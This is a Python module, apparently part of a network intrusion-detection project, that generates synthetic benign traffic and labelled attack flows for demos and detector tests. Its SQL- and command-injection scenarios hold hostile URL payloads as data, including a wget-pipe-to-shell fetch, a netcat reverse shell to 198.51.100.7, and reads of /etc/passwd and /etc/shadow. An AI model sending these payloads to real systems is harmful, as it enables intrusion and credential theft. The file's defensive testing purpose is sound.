"""Synthetic traffic generator: a realistic benign baseline plus labelled attack scenarios.

Used by the demo mode, the golden traffic-replay corpus and the adversarial tests.
Deterministic for a given seed.
"""

from __future__ import annotations

import random
import string
import time
from collections.abc import Iterator
from dataclasses import dataclass

from neurawall.core.models import (
    Direction,
    DnsMeta,
    FlowRecord,
    HttpMeta,
    L7Meta,
    Protocol,
    TlsMeta,
)

BENIGN_SITES = [
    "www.google.com",
    "outlook.office365.com",
    "github.com",
    "api.github.com",
    "slack.com",
    "zoom.us",
    "www.wikipedia.org",
    "s3.amazonaws.com",
    "login.microsoftonline.com",
    "cdn.jsdelivr.net",
    "fonts.googleapis.com",
    "updates.ubuntu.com",
    "registry.npmjs.org",
    "pypi.org",
    "docs.python.org",
    "www.salesforce.com",
    "api.stripe.com",
    "www.linkedin.com",
]
BENIGN_PATHS = [
    "/",
    "/index.html",
    "/api/v1/items",
    "/api/v1/users/42",
    "/static/app.js",
    "/search?q=quarterly+report",
    "/graphql",
    "/health",
    "/login",
    "/images/logo.png",
]
CHROME_JA3 = "cd08e31494f9531f560d64c695473da9"
FIREFOX_JA3 = "579ccef312d18482fc42e2b822ca2430"
PY_REQUESTS_JA3 = "3b5074b1b5d032e5620f69f9f700ff0e"
BROWSER_UAS = {
    "chrome": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/128.0 Safari/537.36",
    "firefox": "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
}

SCENARIOS = (
    "port_scan",
    "c2_beacon",
    "dga",
    "dns_tunnel",
    "sql_injection",
    "command_injection",
    "exfiltration",
    "tls_mismatch",
    "brute_force",
)


@dataclass(frozen=True)
class LabelledFlow:
    flow: FlowRecord
    scenario: str  # "benign" or one of SCENARIOS


class TrafficGenerator:
    def __init__(
        self, seed: int = 1, node_id: str = "demo-node", hosts: int = 40, start: float | None = None
    ) -> None:
        self.rng = random.Random(seed)
        self.node_id = node_id
        self.hosts = [f"10.20.{i // 250}.{i % 250 + 10}" for i in range(hosts)]
        self.servers = [f"10.30.0.{i}" for i in range(10, 16)]
        self.clock = start if start is not None else time.time()
        self._site_ips = {s: self._public_ip() for s in BENIGN_SITES}

    # -- helpers ----------------------------------------------------------------

    def _public_ip(self) -> str:
        r = self.rng
        return (
            f"{r.choice([13, 20, 34, 52, 104, 142, 151, 172, 185])}.{r.randint(1, 250)}."
            f"{r.randint(1, 250)}.{r.randint(1, 250)}"
        )

    def _tick(self, mean_gap: float = 0.05) -> float:
        self.clock += self.rng.expovariate(1 / mean_gap)
        return self.clock

    def _flow(self, **kw: object) -> FlowRecord:
        ts = self._tick()
        dur = float(kw.pop("duration", self.rng.uniform(0.05, 3.0)))  # type: ignore[arg-type]
        return FlowRecord(
            node_id=self.node_id,
            ts_start=ts,
            ts_end=ts + dur,
            src_port=self.rng.randint(32768, 60999),
            **kw,
        )  # type: ignore[arg-type]

    # -- benign -------------------------------------------------------------------

    def benign(self) -> FlowRecord:
        r = self.rng
        kind = r.random()
        host = r.choice(self.hosts)
        if kind < 0.55:  # HTTPS browsing / SaaS
            site = r.choice(BENIGN_SITES)
            client = r.choice(["chrome", "firefox"])
            return self._flow(
                src_ip=host,
                dst_ip=self._site_ips[site],
                dst_port=443,
                protocol=Protocol.TCP,
                bytes_out=int(r.lognormvariate(7.0, 0.6)),
                bytes_in=int(r.lognormvariate(9.5, 1.0)),
                packets_out=r.randint(6, 30),
                packets_in=r.randint(8, 60),
                tcp_flags="SA-PA-FA",
                l7=L7Meta(
                    tls=TlsMeta(
                        sni=site,
                        version="TLS1.3",
                        alpn=["h2"],
                        ja3=CHROME_JA3 if client == "chrome" else FIREFOX_JA3,
                        claimed_client=client,
                    )
                ),
            )
        if kind < 0.8:  # DNS
            site = r.choice(BENIGN_SITES)
            return self._flow(
                src_ip=host,
                dst_ip="10.30.0.53",
                dst_port=53,
                protocol=Protocol.UDP,
                direction=Direction.INTERNAL,
                duration=r.uniform(0.001, 0.05),
                bytes_out=r.randint(40, 90),
                bytes_in=r.randint(80, 300),
                packets_out=1,
                packets_in=1,
                l7=L7Meta(
                    dns=DnsMeta(qname=site, qtype=r.choice(["A", "AAAA"]), answers=r.randint(1, 4))
                ),
            )
        # Internal web app
        path = r.choice(BENIGN_PATHS)
        return self._flow(
            src_ip=host,
            dst_ip=r.choice(self.servers),
            dst_port=8080,
            protocol=Protocol.TCP,
            direction=Direction.INTERNAL,
            bytes_out=int(r.lognormvariate(6.5, 0.5)),
            bytes_in=int(r.lognormvariate(8.5, 0.8)),
            packets_out=r.randint(4, 15),
            packets_in=r.randint(4, 25),
            tcp_flags="SA-PA-FA",
            l7=L7Meta(
                http=HttpMeta(
                    method=r.choice(["GET", "GET", "POST"]),
                    host="intranet.corp",
                    path=path,
                    user_agent=BROWSER_UAS["chrome"],
                    status=200,
                )
            ),
        )

    # -- attack scenarios -----------------------------------------------------------

    def scenario(self, name: str, count: int = 20) -> list[FlowRecord]:
        return getattr(self, f"_s_{name}")(count)

    def _s_port_scan(self, n: int) -> list[FlowRecord]:
        src, dst = self.rng.choice(self.hosts), self.rng.choice(self.servers)
        ports = self.rng.sample(range(1, 10000), max(n, 60))
        return [
            self._flow(
                src_ip=src,
                dst_ip=dst,
                dst_port=p,
                direction=Direction.INTERNAL,
                duration=0.001,
                bytes_out=60,
                bytes_in=40,
                packets_out=1,
                packets_in=1,
                tcp_flags="S-RA",
            )
            for p in ports
        ]

    def _s_c2_beacon(self, n: int) -> list[FlowRecord]:
        src, c2 = self.rng.choice(self.hosts), self._public_ip()
        period = 300_000.0
        iat = [period * self.rng.uniform(0.97, 1.03) for _ in range(12)]
        return [
            self._flow(
                src_ip=src,
                dst_ip=c2,
                dst_port=443,
                bytes_out=self.rng.randint(300, 340),
                bytes_in=self.rng.randint(180, 220),
                packets_out=4,
                packets_in=4,
                inter_arrival_ms=iat,
                l7=L7Meta(
                    tls=TlsMeta(
                        sni="cdn-telemetry-sync.net",
                        version="TLS1.2",
                        ja3=PY_REQUESTS_JA3,
                        claimed_client="chrome",
                    )
                ),
            )
            for _ in range(n)
        ]

    def _dga_name(self) -> str:
        length = self.rng.randint(14, 24)
        label = "".join(
            self.rng.choice(string.ascii_lowercase + string.digits) for _ in range(length)
        )
        return f"{label}.{self.rng.choice(['com', 'net', 'info', 'xyz', 'top'])}"

    def _s_dga(self, n: int) -> list[FlowRecord]:
        src = self.rng.choice(self.hosts)
        return [
            self._flow(
                src_ip=src,
                dst_ip="10.30.0.53",
                dst_port=53,
                protocol=Protocol.UDP,
                direction=Direction.INTERNAL,
                duration=0.01,
                bytes_out=70,
                bytes_in=130,
                packets_out=1,
                packets_in=1,
                l7=L7Meta(dns=DnsMeta(qname=self._dga_name(), rcode="NXDOMAIN")),
            )
            for _ in range(n)
        ]

    def _s_dns_tunnel(self, n: int) -> list[FlowRecord]:
        src = self.rng.choice(self.hosts)
        out = []
        for _ in range(n):
            chunk = "".join(self.rng.choice("abcdef0123456789") for _ in range(56))
            out.append(
                self._flow(
                    src_ip=src,
                    dst_ip="10.30.0.53",
                    dst_port=53,
                    protocol=Protocol.UDP,
                    direction=Direction.INTERNAL,
                    duration=0.02,
                    bytes_out=160,
                    bytes_in=220,
                    packets_out=1,
                    packets_in=1,
                    l7=L7Meta(
                        dns=DnsMeta(
                            qname=f"{chunk}.{self.rng.randint(0, 999)}.t.exfil-dns.io", qtype="TXT"
                        )
                    ),
                )
            )
        return out

    def _web_attack(self, n: int, paths: list[str]) -> list[FlowRecord]:
        src = self._public_ip()
        return [
            self._flow(
                src_ip=src,
                dst_ip=self.servers[0],
                dst_port=8080,
                direction=Direction.INBOUND,
                bytes_out=900,
                bytes_in=1200,
                packets_out=6,
                packets_in=6,
                l7=L7Meta(
                    http=HttpMeta(
                        method="GET",
                        host="shop.corp",
                        path=self.rng.choice(paths),
                        user_agent="sqlmap/1.8.4#stable (https://sqlmap.org)",
                        status=500,
                    )
                ),
            )
            for _ in range(n)
        ]

    def _s_sql_injection(self, n: int) -> list[FlowRecord]:
        return self._web_attack(
            n,
            [
                "/products?id=1%27%20OR%20%271%27%3D%271",
                "/products?id=1 UNION SELECT username,password FROM users--",
                "/search?q=%27;DROP TABLE orders;--",
                "/login?user=admin'--&pass=x",
                "/item?id=1 AND SLEEP(5)",
            ],
        )

    def _s_command_injection(self, n: int) -> list[FlowRecord]:
        return self._web_attack(
            n,
            [
                "/ping?host=127.0.0.1;cat%20/etc/passwd",
                "/cgi-bin/status?cmd=$(wget http://198.51.100.7/x.sh|sh)",
                "/api/convert?file=a.png|nc -e /bin/sh 198.51.100.7 4444",
                "/download?f=../../../../etc/shadow",
                "/render?tpl={{7*7}}{{config.__class__.__init__.__globals__}}",
            ],
        )

    def _s_exfiltration(self, n: int) -> list[FlowRecord]:
        src, dst = self.rng.choice(self.hosts), self._public_ip()
        return [
            self._flow(
                src_ip=src,
                dst_ip=dst,
                dst_port=443,
                duration=self.rng.uniform(60, 400),
                bytes_out=self.rng.randint(80_000_000, 400_000_000),
                bytes_in=self.rng.randint(20_000, 90_000),
                packets_out=self.rng.randint(60_000, 280_000),
                packets_in=self.rng.randint(3_000, 9_000),
                l7=L7Meta(
                    tls=TlsMeta(
                        sni="files-transfer-now.top",
                        version="TLS1.2",
                        ja3=CHROME_JA3,
                        claimed_client="chrome",
                    )
                ),
            )
            for _ in range(max(1, n // 5))
        ]

    def _s_tls_mismatch(self, n: int) -> list[FlowRecord]:
        src = self.rng.choice(self.hosts)
        return [
            self._flow(
                src_ip=src,
                dst_ip=self._public_ip(),
                dst_port=443,
                bytes_out=1500,
                bytes_in=4000,
                packets_out=8,
                packets_in=9,
                l7=L7Meta(
                    tls=TlsMeta(
                        sni="update-check.example.org",
                        version="TLS1.2",
                        ja3=PY_REQUESTS_JA3,
                        claimed_client="chrome",
                    )
                ),
            )
            for _ in range(max(1, n // 2))
        ]

    def _s_brute_force(self, n: int) -> list[FlowRecord]:
        src = self._public_ip()
        return [
            self._flow(
                src_ip=src,
                dst_ip=self.servers[1],
                dst_port=22,
                direction=Direction.INBOUND,
                duration=self.rng.uniform(0.5, 2.0),
                bytes_out=2400,
                bytes_in=2800,
                packets_out=14,
                packets_in=13,
                tcp_flags="SA-PA-FA",
            )
            for _ in range(max(n, 80))
        ]

    # -- streams ------------------------------------------------------------------------

    def stream(self, total: int, attack_rate: float = 0.0) -> Iterator[LabelledFlow]:
        emitted = 0
        while emitted < total:
            if attack_rate and self.rng.random() < attack_rate:
                name = self.rng.choice(SCENARIOS)
                for f in self.scenario(name, self.rng.randint(5, 15)):
                    yield LabelledFlow(f, name)
                    emitted += 1
            else:
                yield LabelledFlow(self.benign(), "benign")
                emitted += 1
